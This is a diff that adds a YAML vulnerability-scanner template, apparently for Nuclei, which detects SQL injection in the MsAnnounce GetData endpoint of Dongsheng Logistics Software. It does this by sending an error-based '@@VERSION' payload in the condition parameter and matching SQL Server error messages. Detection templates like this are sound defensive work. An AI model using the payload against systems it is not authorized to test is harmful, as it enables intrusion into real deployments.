@@ -1,0 +1,29 @@
+id: poc-yaml-dongshengsoft-msannounce-sqli
+info:
+  name: Dongsheng Logistics Software MsAnnounce SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in Dongsheng Logistics Software MsAnnounce.
+    Detected by observing specific error messages related to SQL exceptions.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/MvcShipping/MsAnnounce/GetData?handle=edit&condition=1+<@@VERSION--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "Microsoft SQL Server"
+          - "SqlException:"
+          - "MsAnnounceController"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
